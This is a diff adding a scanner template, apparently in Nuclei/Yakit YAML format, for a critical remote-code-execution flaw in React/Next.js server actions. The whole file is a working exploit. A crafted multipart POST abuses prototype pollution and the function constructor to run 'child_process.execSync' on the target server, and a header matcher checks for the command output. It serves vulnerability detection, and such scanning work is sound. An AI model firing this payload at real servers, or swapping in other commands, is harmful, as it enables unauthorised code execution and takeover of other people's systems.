@@ -1,0 +1,45 @@
+id: React-Rce
+
+info:
+  name: React-Rce
+  author: god
+  severity: critical
+  description: react-2025-rce
+  metadata:
+    max-request: 1
+    shodan-query: ""
+    verified: true
+  yakit-info:
+    sign: d4b2c3c1b59db3697a7a3cec1dc7ad60
+
+http:
+- method: POST
+  path:
+  - '{{RootURL}}/'
+  headers:
+    Content-Length: "565"
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
+    Next-Action: x
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+      like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0
+    X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
+    X-Nextjs-Request-Id: b5dce965
+  body: "------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data;
+    name=\"0\"\r\n\r\n{\"then\":\"$1:__proto__:then\",\"status\":\"resolved_model\",\"reason\":-1,\"value\":\"{\\\"then\\\":\\\"$B1337\\\"}\",\"_response\":{\"_prefix\":\"var
+    res=process.mainModule.require('child_process').execSync('whoami').toString().trim();;throw
+    Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?checkcheckme=${res};307;`});\",\"_chunks\":\"$Q2\",\"_formData\":{\"get\":\"$1:constructor:constructor\"}}}\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition:
+    form-data; name=\"1\"\r\n\r\n\"$@0\"\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition:
+    form-data; name=\"2\"\r\n\r\n[]\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
+
+  max-redirects: 3
+  disable-cookie: true
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: header
+    words:
+    - checkcheckme
+    condition: and
+
+
+# Generated From WebFuzzer on 2025-12-05 17:19:20
